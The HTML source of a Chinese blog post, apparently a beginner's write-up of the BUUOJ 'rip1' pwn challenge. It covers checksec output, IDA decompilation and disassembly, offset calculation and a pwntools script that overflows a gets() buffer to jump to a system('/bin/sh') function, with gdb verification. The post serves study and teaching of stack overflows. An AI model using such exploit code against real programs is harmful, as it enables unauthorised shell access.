@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="5AUIVYTbHIAuz-eQtxSfZbWW5eg9_EVZMSQycIuXrG0">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.18.0","exturl":true,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":true,"style":"default"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/config.min.js"></script>
+
+    <meta name="description" content="从一道入门题目开始 题目来源:https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges，Pwn目录下的rip1，下载附件pwn1。 查看pwn1的安全设置 1234567891011checksec --file&#x3D;.&#x2F;pwn1RELRO: Partial RELROSTACK CANARY: No canary found #没有cannaryNX: NX disabled   #栈可执行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn初体验">
+<meta property="og:url" content="http://example.com/2021/05/08/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/index.html">
+<meta property="og:site_name" content="Oh, Tony">
+<meta property="og:description" content="从一道入门题目开始 题目来源:https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges，Pwn目录下的rip1，下载附件pwn1。 查看pwn1的安全设置 1234567891011checksec --file&#x3D;.&#x2F;pwn1RELRO: Partial RELROSTACK CANARY: No canary found #没有cannaryNX: NX disabled   #栈可执行">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/05/08/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/stack.jpg">
+<meta property="og:image" content="http://example.com/2021/05/08/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/image-20210508213638630.png">
+<meta property="og:image" content="http://example.com/2021/05/08/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/image-20210508215617042.png">
+<meta property="og:image" content="http://example.com/2021/05/08/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/image-20210508213916848.png">
+<meta property="og:image" content="http://example.com/2021/05/08/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/image-20210508215413720.png">
+<meta property="article:published_time" content="2021-05-08T07:47:37.000Z">
+<meta property="article:modified_time" content="2023-08-04T12:54:58.484Z">
+<meta property="article:author" content="Tony">
+<meta property="article:tag" content="逆向 - pwn - 汇编 -">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/05/08/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/stack.jpg">
+
+
+<link rel="canonical" href="http://example.com/2021/05/08/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2021/05/08/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/","path":"2021/05/08/pwn初体验/","title":"pwn初体验"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>pwn初体验 | Oh, Tony</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-43861RVV8R"></script>
+  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"G-43861RVV8R","only_pageview":false}</script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/third-party/analytics/google-analytics.min.js"></script>
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Oh, Tony</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-bell fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa fa-th fa-fw"></i>分类<span class="badge">9</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">31</span></a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">37</span></a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8E%E4%B8%80%E9%81%93%E5%85%A5%E9%97%A8%E9%A2%98%E7%9B%AE%E5%BC%80%E5%A7%8B"><span class="nav-number">1.</span> <span class="nav-text">从一道入门题目开始</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8Bpwn1%E7%9A%84%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE"><span class="nav-number">1.1.</span> <span class="nav-text">查看pwn1的安全设置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8ida%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="nav-number">1.2.</span> <span class="nav-text">使用ida反编译</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%9D%E8%B7%AF"><span class="nav-number">1.3.</span> <span class="nav-text">栈溢出思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7"><span class="nav-number">1.4.</span> <span class="nav-text">相关工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E7%9A%84%E5%BC%80%E8%BE%9F"><span class="nav-number">1.5.</span> <span class="nav-text">栈的开辟</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E5%AE%9E%E7%8E%B0"><span class="nav-number">1.6.</span> <span class="nav-text">具体实现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E7%8E%AF%E5%A2%83%E9%AA%8C%E8%AF%81"><span class="nav-number">1.7.</span> <span class="nav-text">栈环境验证</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Tony"
+      src="https://avatars.githubusercontent.com/u/46778179?v=4">
+  <p class="site-author-name" itemprop="name">Tony</p>
+  <div class="site-description" itemprop="description">GXG</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">37</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25ldy1Ub255V2FuZw==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;new-TonyWang"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9uZXctdG9ueXdhbmcuZ2l0aHViLmlvL3dhbmd0b255eXUyMjJAZ21haWwuY29t" title="Email → https:&#x2F;&#x2F;new-tonywang.github.io&#x2F;wangtonyyu222@gmail.com"><i class="fa fa-envelope fa-fw"></i>Email</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9udWFhLXMzbGFiLmdpdGh1Yi5pby9kYWlseVBhcGVyLw==" title="S3Lab论文推荐 → https:&#x2F;&#x2F;nuaa-s3lab.github.io&#x2F;dailyPaper&#x2F;">S3Lab论文推荐</span>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/08/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/46778179?v=4">
+      <meta itemprop="name" content="Tony">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Oh, Tony">
+      <meta itemprop="description" content="GXG">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="pwn初体验 | Oh, Tony">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pwn初体验<span class="exturl post-edit-link" data-url="aHR0cHM6Ly9naXRodWIuY29tL25leHQtdGhlbWUvdGhlbWUtbmV4dC1kb2NzL2VkaXQvbWFzdGVyL3NvdXJjZS9fcG9zdHMvcHdu5Yid5L2T6aqMLm1k" title="编辑"><i class="fa fa-pen-nib"></i></span>
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-05-08 15:47:37" itemprop="dateCreated datePublished" datetime="2021-05-08T15:47:37+08:00">2021-05-08</time>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus：</span>
+    
+    <a title="disqus" href="/2021/05/08/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2021/05/08/pwn初体验/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="从一道入门题目开始">从一道入门题目开始</h2>
+<p>题目来源:https://buuoj.cn/challenges，Pwn目录下的<code>rip1</code>，下载附件<code>pwn1</code>。</p>
+<h3 id="查看pwn1的安全设置">查看pwn1的安全设置</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">checksec --file=./pwn1</span><br><span class="line">RELRO: Partial RELRO</span><br><span class="line">STACK CANARY: No canary found #没有cannary</span><br><span class="line">NX: NX disabled   #栈可执行         </span><br><span class="line">PIE: No PIE	#未开启代码段随机化(程序被加载进了固定的地址中)</span><br><span class="line">RPATH: No RPATH </span><br><span class="line">RUNPATH:  No RUNPATH</span><br><span class="line">Symbols: 64 Symbols 		</span><br><span class="line">FORTIFY	Fortified: No	</span><br><span class="line">Fortifiable: 0</span><br><span class="line">FILE: ./pwn1</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p>介绍一些常用的安全选项:</p>
+<ul>
+<li>NX: 数据执行保护，即禁止程序在非可执行的内存区中执行指令（例如 .rodata段,stack,和heap）。使用gcc 添加 <code>-x execstack</code> 即可开启栈可执行功能。</li>
+<li>PIE: 地址随机化。是否使用地址随机化，使用<code>-fPIE</code>进行开启。</li>
+<li>STACK CANARY:是否使用栈保护。若开启栈保护，则会验证cannary中存的数据是否相同，若不相同则发生了栈溢出。</li>
+</ul>
+<h3 id="使用ida反编译">使用ida反编译</h3>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">15</span>]; <span class="comment">// [rsp+1h] [rbp-Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);</span><br><span class="line">  <span class="built_in">gets</span>(s, argv);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>发现该文件使用了极其不安全的gets()函数。因为gets()不会判断输入的长度，容易造成栈溢出漏洞。继续浏览函数列表，发现有一个函数<code>fun</code></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">fun</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>因此可以使用栈溢出调用system函数从而获得shell。</p>
+<p>贴一下两个函数的汇编</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401142</span> ; <span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function">.text:<span class="number">0000000000401142</span>                 public main</span></span><br><span class="line"><span class="function">.text:<span class="number">0000000000401142</span> main            proc near               ;</span> DATA XREF: _start+<span class="number">1</span>D↑o</span><br><span class="line">.text:<span class="number">0000000000401142</span></span><br><span class="line">.text:<span class="number">0000000000401142</span> s               = byte ptr <span class="number">-0F</span>h</span><br><span class="line">.text:<span class="number">0000000000401142</span></span><br><span class="line">.text:<span class="number">0000000000401142</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000401142</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000401143</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000401146</span>                 sub     rsp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">000000000040114</span>A                 lea     rdi, s          ; <span class="string">&quot;please input&quot;</span></span><br><span class="line">.text:<span class="number">0000000000401151</span>                 call    _puts</span><br><span class="line">.text:<span class="number">0000000000401156</span>                 lea     rax, [rbp+s]</span><br><span class="line">.text:<span class="number">000000000040115</span>A                 mov     rdi, rax</span><br><span class="line">.text:<span class="number">000000000040115</span>D                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401162</span>                 call    _gets</span><br><span class="line">.text:<span class="number">0000000000401167</span>                 lea     rax, [rbp+s]</span><br><span class="line">.text:<span class="number">000000000040116B</span>                 mov     rdi, rax        ; s</span><br><span class="line">.text:<span class="number">000000000040116</span>E                 call    _puts</span><br><span class="line">.text:<span class="number">0000000000401173</span>                 lea     rdi, aOkBye     ; <span class="string">&quot;ok,bye!!!&quot;</span></span><br><span class="line">.text:<span class="number">000000000040117</span>A                 call    _puts</span><br><span class="line">.text:<span class="number">000000000040117F</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401184</span>                 leave</span><br><span class="line">.text:<span class="number">0000000000401185</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000401185</span> ; &#125; <span class="comment">// starts at 401142</span></span><br><span class="line">.text:<span class="number">0000000000401185</span> main            endp</span><br><span class="line">.text:<span class="number">0000000000401186</span> ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="number">0000000000401186</span> </span><br><span class="line">.text:<span class="number">0000000000401186</span></span><br><span class="line">.text:<span class="number">0000000000401186</span>                 <span class="keyword">public</span> fun</span><br><span class="line">.text:<span class="number">0000000000401186</span> fun             proc near</span><br><span class="line">.text:<span class="number">0000000000401186</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000401186</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000401187</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">000000000040118</span>A                 lea     rdi, command    ; <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">.text:<span class="number">0000000000401191</span>                 call    _system </span><br><span class="line">.text:<span class="number">0000000000401196</span>                 nop</span><br><span class="line">.text:<span class="number">0000000000401197</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">0000000000401198</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000401198</span> ; &#125; <span class="comment">// starts at 401186</span></span><br><span class="line">.text:<span class="number">0000000000401198</span> fun             endp</span><br></pre></td></tr></table></figure>
+<h3 id="栈溢出思路">栈溢出思路</h3>
+<ol type="1">
+<li>找到输入数据存在栈中的buffer的地址</li>
+<li>计算buffer到栈中该函数存储返回值的距离</li>
+<li>使用无用数据填充缓冲区和栈，并将system的地址写入返回值</li>
+<li>在ubuntu18等操作系统中需要进行栈平衡。</li>
+</ol>
+<h3 id="相关工具">相关工具</h3>
+<ol type="1">
+<li>python 的 pwntools包进行栈溢出的实现</li>
+<li>gdb+pwntools实现调试</li>
+</ol>
+<h3 id="栈的开辟">栈的开辟</h3>
+<p>x64和ARM很类似，x64中入栈和出栈的指令以及其分解：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//入栈</span></span><br><span class="line">call &lt;标号&gt; <span class="comment">//这个指令是先将call+标号的下一条语句的IP放入栈中，然后使当前的IP进行位移。 (类似ARM中的LR寄存器压栈和b跳转指令)</span></span><br><span class="line">push ebp/rbp <span class="comment">//通过sp将寄存器中数据入栈，每压入一个值sp就向低地址移动一个单位。(此bp类似ARM中的R11)。可拆成如下两个指令</span></span><br><span class="line">    		<span class="comment">//sub rsp #8</span></span><br><span class="line">    		<span class="comment">//mov rbp [rsp]</span></span><br><span class="line">mov esp/rsp	<span class="comment">//将当前sp的数据指向新栈的栈顶</span></span><br><span class="line">sub esp/rsp <span class="meta">#num <span class="comment">//使用sp向低地址开辟num大小的空间</span></span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//出栈</span></span><br><span class="line">leave <span class="comment">//从栈中恢复ebp，该指令可以拆分成如下两个</span></span><br><span class="line">      <span class="comment">//mov esp ebp //回收esp</span></span><br><span class="line">      <span class="comment">//add rsp #8	//对ebp赋值,pop也可拆解为如下两个指令：</span></span><br><span class="line">    				<span class="comment">//</span></span><br><span class="line">    	</span><br><span class="line">retn <span class="comment">//恢复IP寄存器，可以理解为pop IP，与call指令对应</span></span><br><span class="line">     <span class="comment">//pop ip可拆为</span></span><br><span class="line">     <span class="comment">//mov ip (rsp)</span></span><br><span class="line">     <span class="comment">//add rsp #8</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>栈中数据排布大致如下:</p>
+<p><img src="/2021/05/08/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/stack.jpg"></p>
+<h3 id="具体实现">具体实现</h3>
+<p>puts函数的缓冲区是s，s距离rbp寄存器相隔<code>0xF</code>，相当于距离栈顶相隔<code>0xF</code>。由于是64位的elf文件，则s距离栈中rbp的距离为<code>0xF+0x8</code>，距离main函数的返回地址长度是`<code>0xF+0x8+0x8</code>。然后我们只需要将最后的地址设置为fun函数的地址即可。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401142</span> s               = byte ptr <span class="number">-0F</span>h</span><br><span class="line">...</span><br><span class="line">.text:<span class="number">0000000000401167</span>                 lea     rax, [rbp+s]</span><br><span class="line">.text:<span class="number">000000000040116B</span>                 mov     rdi, rax        ; s</span><br><span class="line">.text:<span class="number">000000000040116</span>E                 call    _puts</span><br></pre></td></tr></table></figure>
+<p>由于在main函数执行<code>leave</code>指令的时候必须要给rbp赋值，并且在ubuntu18上面调用system()函数需要进行栈对齐，因此我们需要一个跳板，将rbp指向栈的顶端(页的整数倍的地址)，然后再跳转到fun函数，于是我们首先跳转到fun的retn中，然后再使用retn指令帮我们跳转到fun函数。使用pwntool构造payload并实施栈溢出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,29175)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p.pid)</span><br><span class="line">retn = <span class="number">0x401198</span><span class="comment">#fun的retn地址</span></span><br><span class="line"><span class="comment">#rand = 0x401091</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xf</span>+<span class="number">0x8</span>)+p64(retn)+p64(<span class="number">0x401186</span>)<span class="comment">#0x401186为fun的起始地址</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="栈环境验证">栈环境验证</h3>
+<p>修改代码，让程序能够暂停好让我们使用gdb attach过去。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,29175)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p.pid)</span><br><span class="line">pause()</span><br><span class="line">retn = <span class="number">0x401198</span><span class="comment">#fun的retn地址</span></span><br><span class="line"><span class="comment">#rand = 0x401091</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xf</span>+<span class="number">0x8</span>)+p64(retn)+p64(<span class="number">0x401186</span>)<span class="comment">#0x401186为fun的起始地址</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>在gdb中在main函数中leave指令处加断点，如下:</p>
+<figure>
+<img src="/2021/05/08/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/image-20210508213638630.png" alt><figcaption>image-20210508213638630</figcaption>
+</figure>
+<p>发现，当前栈中从缓冲区的起始地址到rbp指向的地址中已经被填满了<code>a</code>，返回地址中对应的是fun函数的retn的地址。我们继续执行</p>
+<figure>
+<img src="/2021/05/08/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/image-20210508215617042.png" alt><figcaption>image-20210508215617042</figcaption>
+</figure>
+<p>此时已经执行了leave执行，RBP变成了<code>aaaaaaa</code>,然而main函数返回到的地址变成了fun函数的ret的地址，rsp指向栈顶的地址(此时内存中的栈已经完全混乱，不在拥有一个完整的栈)。我们继续执行</p>
+<figure>
+<img src="/2021/05/08/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/image-20210508213916848.png" alt><figcaption>image-20210508213916848</figcaption>
+</figure>
+<p>此时程序直接跳到了fun的ret的地址，rsp 指向了fun的开始地址，然后我们继续执行</p>
